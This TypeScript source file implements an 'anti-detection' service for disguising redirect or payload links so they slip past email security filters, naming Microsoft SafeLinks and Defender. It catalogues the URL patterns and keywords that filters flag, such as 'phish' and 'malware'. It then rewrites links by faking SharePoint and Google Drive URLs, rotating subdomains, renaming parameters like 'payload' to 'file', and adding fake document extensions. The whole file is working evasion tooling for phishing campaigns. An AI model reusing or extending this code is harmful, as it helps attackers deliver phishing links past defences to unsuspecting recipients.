/**
 * Advanced Anti-Detection Measures
 * Implements sophisticated techniques to avoid email security system detection
 */

export interface DetectionPattern {
  pattern: RegExp;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  category: 'url_structure' | 'parameter' | 'content' | 'timing' | 'behavior';
}

export interface AntiDetectionOptions {
  aggressiveness: 'conservative' | 'moderate' | 'aggressive';
  targetProvider: 'microsoft' | 'google' | 'corporate' | 'generic';
  enableTimeBasedEvasion: boolean;
  enableBehavioralMimicry: boolean;
  enablePatternRotation: boolean;
}

export interface EvasionStrategy {
  id: string;
  name: string;
  description: string;
  effectiveness: number;
  riskLevel: 'low' | 'medium' | 'high';
  applicableProviders: string[];
  implementation: (url: string, options?: any) => string;
}

export class AntiDetectionService {
  
  /**
   * Known detection patterns to avoid
   */
  private detectionPatterns: DetectionPattern[] = [
    // URL Structure Patterns
    {
      pattern: /\/e\/[a-zA-Z0-9]+/,
      severity: 'critical',
      description: 'Classic /e/ redirect pattern - highly detected',
      category: 'url_structure'
    },
    {
      pattern: /\/redirect\?/i,
      severity: 'high',
      description: 'Obvious redirect keyword in URL',
      category: 'url_structure'
    },
    {
      pattern: /\/click\?/i,
      severity: 'high',
      description: 'Click tracking pattern',
      category: 'url_structure'
    },
    {
      pattern: /\/track\?/i,
      severity: 'high',
      description: 'Tracking pattern',
      category: 'url_structure'
    },
    {
      pattern: /\/go\?/i,
      severity: 'medium',
      description: 'Generic redirect pattern',
      category: 'url_structure'
    },
    {
      pattern: /\/link\?/i,
      severity: 'medium',
      description: 'Link redirect pattern',
      category: 'url_structure'
    },
    
    // Parameter Patterns
    {
      pattern: /[?&]url=[^&]+/i,
      severity: 'high',
      description: 'URL parameter containing target URL',
      category: 'parameter'
    },
    {
      pattern: /[?&]target=[^&]+/i,
      severity: 'high',
      description: 'Target parameter',
      category: 'parameter'
    },
    {
      pattern: /[?&]dest=[^&]+/i,
      severity: 'medium',
      description: 'Destination parameter',
      category: 'parameter'
    },
    {
      pattern: /[?&][a-z]=[A-Z0-9]{20,}/,
      severity: 'medium',
      description: 'Single letter parameter with long encoded value',
      category: 'parameter'
    },
    {
      pattern: /[?&]data=[A-Za-z0-9+\/=]{30,}/,
      severity: 'high',
      description: 'Base64-like data parameter',
      category: 'parameter'
    },
    {
      pattern: /[?&]payload=[^&]+/i,
      severity: 'critical',
      description: 'Payload parameter - security red flag',
      category: 'parameter'
    },
    
    // Content Patterns
    {
      pattern: /phish/i,
      severity: 'critical',
      description: 'Phishing keyword',
      category: 'content'
    },
    {
      pattern: /malware/i,
      severity: 'critical',
      description: 'Malware keyword',
      category: 'content'
    },
    {
      pattern: /suspicious/i,
      severity: 'high',
      description: 'Suspicious keyword',
      category: 'content'
    },
    {
      pattern: /base64/i,
      severity: 'medium',
      description: 'Base64 reference',
      category: 'content'
    },
    {
      pattern: /encoded/i,
      severity: 'medium',
      description: 'Encoded reference',
      category: 'content'
    },
    {
      pattern: /decrypt/i,
      severity: 'high',
      description: 'Decrypt reference',
      category: 'content'
    }
  ];

  /**
   * Evasion strategies
   */
  private evasionStrategies: EvasionStrategy[] = [
    {
      id: 'legitimate_service_mimicry',
      name: 'Legitimate Service Mimicry',
      description: 'Mimic URLs from trusted services like Google Drive, OneDrive, etc.',
      effectiveness: 95,
      riskLevel: 'low',
      applicableProviders: ['microsoft', 'google', 'corporate', 'generic'],
      implementation: (url: string) => this.applyServiceMimicry(url)
    },
    {
      id: 'subdomain_rotation',
      name: 'Subdomain Rotation',
      description: 'Use different subdomains to distribute reputation',
      effectiveness: 85,
      riskLevel: 'low',
      applicableProviders: ['microsoft', 'google', 'corporate', 'generic'],
      implementation: (url: string) => this.applySubdomainRotation(url)
    },
    {
      id: 'time_based_obfuscation',
      name: 'Time-Based Obfuscation',
      description: 'Change URL patterns based on time of day',
      effectiveness: 80,
      riskLevel: 'medium',
      applicableProviders: ['microsoft', 'google', 'corporate'],
      implementation: (url: string) => this.applyTimeBasedObfuscation(url)
    },
    {
      id: 'parameter_camouflage',
      name: 'Parameter Camouflage',
      description: 'Disguise encrypted parameters as legitimate ones',
      effectiveness: 90,
      riskLevel: 'low',
      applicableProviders: ['microsoft', 'google', 'corporate', 'generic'],
      implementation: (url: string) => this.applyParameterCamouflage(url)
    },
    {
      id: 'content_type_spoofing',
      name: 'Content-Type Spoofing',
      description: 'Make URLs appear to serve legitimate file types',
      effectiveness: 88,
      riskLevel: 'low',
      applicableProviders: ['microsoft', 'google', 'corporate', 'generic'],
      implementation: (url: string) => this.applyContentTypeSpoofing(url)
    },
    {
      id: 'behavioral_timing',
      name: 'Behavioral Timing',
      description: 'Mimic human browsing patterns in timing',
      effectiveness: 75,
      riskLevel: 'medium',
      applicableProviders: ['corporate', 'generic'],
      implementation: (url: string) => this.applyBehavioralTiming(url)
    }
  ];

  /**
   * Microsoft-specific evasion patterns
   */
  private microsoftEvasionPatterns = [
    // Avoid SafeLinks triggers
    /safelinks\.protection\.outlook\.com/i,
    /protection\.office\.com/i,
    /atp\.microsoft\.com/i,
    
    // Avoid Defender triggers
    /windowsdefender/i,
    /microsoft\.security/i,
    /threat\.protection/i
  ];

  /**
   * Check if URL contains detection patterns
   */
  analyzeDetectionRisk(url: string): {
    riskLevel: 'low' | 'medium' | 'high' | 'critical';
    detectedPatterns: DetectionPattern[];
    recommendations: string[];
  } {
    const detectedPatterns: DetectionPattern[] = [];
    
    for (const pattern of this.detectionPatterns) {
      if (pattern.pattern.test(url)) {
        detectedPatterns.push(pattern);
      }
    }

    // Determine overall risk level
    let riskLevel: 'low' | 'medium' | 'high' | 'critical' = 'low';
    
    if (detectedPatterns.some(p => p.severity === 'critical')) {
      riskLevel = 'critical';
    } else if (detectedPatterns.some(p => p.severity === 'high')) {
      riskLevel = 'high';
    } else if (detectedPatterns.some(p => p.severity === 'medium')) {
      riskLevel = 'medium';
    }

    // Generate recommendations
    const recommendations = this.generateRecommendations(detectedPatterns);

    return {
      riskLevel,
      detectedPatterns,
      recommendations
    };
  }

  /**
   * Apply anti-detection measures to URL
   */
  applyAntiDetection(url: string, options: AntiDetectionOptions): string {
    let processedUrl = url;
    
    // Select appropriate strategies based on options
    const applicableStrategies = this.evasionStrategies.filter(strategy =>
      strategy.applicableProviders.includes(options.targetProvider)
    );

    // Sort by effectiveness
    applicableStrategies.sort((a, b) => b.effectiveness - a.effectiveness);

    // Apply strategies based on aggressiveness
    const strategiesToApply = this.selectStrategies(applicableStrategies, options.aggressiveness);

    for (const strategy of strategiesToApply) {
      try {
        processedUrl = strategy.implementation(processedUrl, options);
      } catch (error) {
        console.warn(`Failed to apply strategy ${strategy.id}:`, error);
      }
    }

    return processedUrl;
  }

  /**
   * Generate Microsoft-specific safe URL
   */
  generateMicrosoftSafeUrl(originalUrl: string): string {
    // Use SharePoint-like pattern
    const timestamp = Date.now().toString();
    const randomId = Math.random().toString(36).substring(2, 8);
    
    return `/sites/corporate/Shared%20Documents/Reports/${timestamp.slice(-6)}/document_${randomId}.pdf?web=1&download=1`;
  }

  /**
   * Generate Google-safe URL
   */
  generateGoogleSafeUrl(originalUrl: string): string {
    // Use Google Drive-like pattern
    const fileId = this.generateGoogleFileId();
    const resourceKey = this.generateResourceKey();
    
    return `/file/d/${fileId}/view?usp=sharing&resourcekey=${resourceKey}`;
  }

  /**
   * Apply service mimicry
   */
  private applyServiceMimicry(url: string): string {
    // Import and use behavioral mimicry service
    const { behavioralMimicry } = require('./behavioralMimicry');
    const pattern = behavioralMimicry.selectOptimalPattern({
      preferHighTrust: true,
      avoidDetection: true
    });
    
    const params = behavioralMimicry.generateServiceParameters(pattern);
    let processedUrl = pattern.template;
    
    // Replace placeholders
    Object.entries(params).forEach(([key, value]) => {
      processedUrl = processedUrl.replace(`{${key}}`, value);
    });
    
    return processedUrl;
  }

  /**
   * Apply subdomain rotation
   */
  private applySubdomainRotation(url: string): string {
    const { subdomainRotation } = require('./subdomainRotation');
    const result = subdomainRotation.buildSubdomainUrl('example.com', url, {
      preferHighTrust: true,
      balanceUsage: true
    });
    
    return result.url;
  }

  /**
   * Apply time-based obfuscation
   */
  private applyTimeBasedObfuscation(url: string): string {
    const { timeBasedRotation } = require('./timeBasedRotation');
    const pattern = timeBasedRotation.selectTimeBasedPattern();
    const params = timeBasedRotation.generateTimeBasedParameters(pattern);
    
    let processedUrl = pattern.template;
    Object.entries(params).forEach(([key, value]) => {
      processedUrl = processedUrl.replace(`{${key}}`, value);
    });
    
    return processedUrl;
  }

  /**
   * Apply parameter camouflage
   */
  private applyParameterCamouflage(url: string): string {
    // Replace suspicious parameter names with legitimate ones
    const parameterMappings = {
      'data': 'doc',
      'payload': 'file',
      'encrypted': 'id',
      'target': 'ref',
      'dest': 'source'
    };

    let processedUrl = url;
    Object.entries(parameterMappings).forEach(([suspicious, legitimate]) => {
      const regex = new RegExp(`([?&])${suspicious}=`, 'gi');
      processedUrl = processedUrl.replace(regex, `$1${legitimate}=`);
    });

    return processedUrl;
  }

  /**
   * Apply content-type spoofing
   */
  private applyContentTypeSpoofing(url: string): string {
    // Add file extension to make URL look like legitimate file
    if (!url.includes('.')) {
      const extensions = ['.pdf', '.docx', '.xlsx', '.pptx'];
      const extension = extensions[Math.floor(Math.random() * extensions.length)];
      
      // Insert before query parameters
      const queryIndex = url.indexOf('?');
      if (queryIndex > -1) {
        return url.substring(0, queryIndex) + extension + url.substring(queryIndex);
      } else {
        return url + extension;
      }
    }
    
    return url;
  }

  /**
   * Apply behavioral timing
   */
  private applyBehavioralTiming(url: string): string {
    // Add timestamp that mimics human behavior
    const now = new Date();
    const businessHours = now.getHours() >= 9 && now.getHours() <= 17;
    const isWeekday = now.getDay() >= 1 && now.getDay() <= 5;
    
    if (businessHours && isWeekday) {
      // Business hours - add professional timestamp
      const timestamp = Math.floor(now.getTime() / 1000);
      return this.addParameter(url, 'timestamp', timestamp.toString());
    } else {
      // Off hours - add casual timestamp
      const timestamp = Math.floor(now.getTime() / 60000); // Minute precision
      return this.addParameter(url, 'time', timestamp.toString());
    }
  }

  /**
   * Select strategies based on aggressiveness
   */
  private selectStrategies(strategies: EvasionStrategy[], aggressiveness: string): EvasionStrategy[] {
    switch (aggressiveness) {
      case 'conservative':
        return strategies.filter(s => s.riskLevel === 'low').slice(0, 2);
      case 'moderate':
        return strategies.filter(s => s.riskLevel !== 'high').slice(0, 3);
      case 'aggressive':
        return strategies.slice(0, 4);
      default:
        return strategies.slice(0, 2);
    }
  }

  /**
   * Generate recommendations based on detected patterns
   */
  private generateRecommendations(detectedPatterns: DetectionPattern[]): string[] {
    const recommendations: string[] = [];
    
    const categories = [...new Set(detectedPatterns.map(p => p.category))];
    
    if (categories.includes('url_structure')) {
      recommendations.push('Use legitimate service mimicry patterns instead of obvious redirect structures');
    }
    
    if (categories.includes('parameter')) {
      recommendations.push('Camouflage suspicious parameters with legitimate-looking names');
    }
    
    if (categories.includes('content')) {
      recommendations.push('Avoid security-related keywords in URLs and parameters');
    }
    
    if (detectedPatterns.some(p => p.severity === 'critical')) {
      recommendations.push('CRITICAL: Completely redesign URL structure to avoid detection');
    }
    
    return recommendations;
  }

  /**
   * Helper methods
   */
  private generateGoogleFileId(): string {
    return `1${this.generateRandomString(32)}`;
  }

  private generateResourceKey(): string {
    return `0-${this.generateRandomString(39)}`;
  }

  private generateRandomString(length: number): string {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private addParameter(url: string, key: string, value: string): string {
    const separator = url.includes('?') ? '&' : '?';
    return `${url}${separator}${key}=${value}`;
  }

  /**
   * Get all detection patterns
   */
  getAllDetectionPatterns(): DetectionPattern[] {
    return [...this.detectionPatterns];
  }

  /**
   * Get all evasion strategies
   */
  getAllEvasionStrategies(): EvasionStrategy[] {
    return [...this.evasionStrategies];
  }

  /**
   * Test URL against all patterns
   */
  testUrl(url: string): {
    isSafe: boolean;
    riskScore: number;
    analysis: ReturnType<typeof this.analyzeDetectionRisk>;
  } {
    const analysis = this.analyzeDetectionRisk(url);
    
    const riskScores = {
      'low': 25,
      'medium': 50,
      'high': 75,
      'critical': 100
    };
    
    const riskScore = riskScores[analysis.riskLevel];
    const isSafe = riskScore <= 25;
    
    return {
      isSafe,
      riskScore,
      analysis
    };
  }
}

export const antiDetection = new AntiDetectionService();
